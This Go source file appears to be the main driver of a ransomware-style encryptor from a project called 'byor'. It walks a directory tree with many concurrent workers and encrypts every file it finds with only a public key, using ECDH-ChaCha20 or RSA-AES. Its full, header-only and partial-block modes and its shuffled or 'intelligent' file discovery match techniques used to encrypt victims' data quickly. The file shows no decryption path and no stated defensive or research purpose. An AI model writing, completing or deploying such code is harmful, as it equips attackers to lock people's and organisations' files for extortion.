package main

import (
	"flag"
	"fmt"
	"log"
	"os"
	"runtime"
	"strings"
	"sync/atomic"

	"byor/pkg/cipher"
	"byor/pkg/discovery"
	"byor/pkg/processor"
	"byor/pkg/strategy"
	"byor/pkg/worker"
)

func main() {
	path := flag.String("path", "", "Path to encrypt")
	cipherType := flag.String("cipher", "ecdh-chacha20", "Cipher to use (ecdh-chacha20 or rsa-aes)")
	pubKeyPath := flag.String("key", "", "Path to public key file")
	modeStr := flag.String("mode", strategy.ModeIntelligentStr, "Encryption mode (intelligent, full, header, partial)")
	partialPercent := flag.Int("partial-percent", 10, "Percentage of file to encrypt in each block for partial mode")
	partialBlocks := flag.Int("partial-blocks", 3, "Number of blocks to encrypt for partial mode")
	workers := flag.Int("workers", runtime.GOMAXPROCS(0), "Number of concurrent workers")
	discoveryStrategyStr := flag.String("discovery", "default", "File discovery strategy (default, intelligent, shuffle)")
	flag.Parse()

	if *path == "" {
		log.Fatal("Path is required for encryption")
	}

	c, err := initCipher(*cipherType, *pubKeyPath)
	if err != nil {
		log.Fatalf("Failed to initialize cipher: %v", err)
	}

	s, err := parseStrategy(*modeStr, *partialPercent, *partialBlocks)
	if err != nil {
		log.Fatalf("Invalid strategy: %v", err)
	}

	discoveryStrategy, err := parseDiscoveryStrategy(*discoveryStrategyStr)
	if err != nil {
		log.Fatalf("Invalid discovery strategy: %v", err)
	}

	processFiles(*path, c, &s, *workers, discoveryStrategy)
}

func initCipher(cipherType, pubKeyPath string) (cipher.Cipher, error) {
	var c cipher.Cipher
	var err error
	var keyFile string

	switch cipherType {
	case "ecdh-chacha20":
		keyFile = "public.key"
		if pubKeyPath != "" {
			keyFile = pubKeyPath
		}
		pubKeyBytes, errRead := os.ReadFile(keyFile)
		if errRead != nil {
			return nil, fmt.Errorf("failed to read ecdh public key: %w", errRead)
		}
		c, err = cipher.NewEcdhChaCha20WithPublicKey(pubKeyBytes)
	case "rsa-aes":
		keyFile = "public.pem"
		if pubKeyPath != "" {
			keyFile = pubKeyPath
		}
		pubKeyBytes, errRead := os.ReadFile(keyFile)
		if errRead != nil {
			return nil, fmt.Errorf("failed to read rsa public key: %w", errRead)
		}
		c, err = cipher.NewRsaAesWithPublicKey(pubKeyBytes)
	default:
		return nil, fmt.Errorf("invalid cipher type: %s. Use 'ecdh-chacha20' or 'rsa-aes'", cipherType)
	}
	return c, err
}

func parseStrategy(modeStr string, pPercent, pBlocks int) (strategy.Strategy, error) {
	var s strategy.Strategy
	switch strings.ToLower(modeStr) {
	case strategy.ModeIntelligentStr:
		s.Mode = strategy.ModeIntelligent
	case strategy.ModeFullStr:
		s.Mode = strategy.ModeFull
	case strategy.ModeHeaderStr:
		s.Mode = strategy.ModeHeader
	case strategy.ModePartialStr:
		s.Mode = strategy.ModePartial
		s.PartialPercent = pPercent
		s.PartialBlocks = pBlocks
	default:
		return s, fmt.Errorf("invalid encryption mode: %s", modeStr)
	}
	return s, nil
}

func parseDiscoveryStrategy(s string) (discovery.Strategy, error) {
	switch strings.ToLower(s) {
	case "default":
		return discovery.Default, nil
	case "intelligent":
		return discovery.Intelligent, nil
	case "shuffle":
		return discovery.Shuffle, nil
	default:
		return 0, fmt.Errorf("invalid discovery strategy: %s", s)
	}
}

func processFiles(rootPath string, c cipher.Cipher, s *strategy.Strategy, numWorkers int, ds discovery.Strategy) {
	var processed, failed int64

	p := worker.New(numWorkers, func(job worker.Job) error {
		err := processor.EncryptFile(string(job), c, s)
		if err != nil {
			atomic.AddInt64(&failed, 1)
			log.Printf("Error processing %s: %v", job, err)
		} else {
			atomic.AddInt64(&processed, 1)
		}
		fmt.Printf("\rProcessed: %d, Failed: %d", atomic.LoadInt64(&processed), atomic.LoadInt64(&failed))
		return err
	})

	p.Run()
	fmt.Printf("\nStarting file discovery in %s with %d workers...\n", rootPath, numWorkers)
	go func() {
		discoverer := discovery.NewDiscoverer(ds, p)
		if err := discoverer.DiscoverFiles(rootPath); err != nil {
			log.Fatalf("File discovery failed: %v", err)
		}
	}()

	for range p.Results() {
	}

	fmt.Printf("\n\nProcessing complete.\n")
	fmt.Printf("Successfully processed: %d\n", atomic.LoadInt64(&processed))
	fmt.Printf("Failed: %d\n", atomic.LoadInt64(&failed))
}
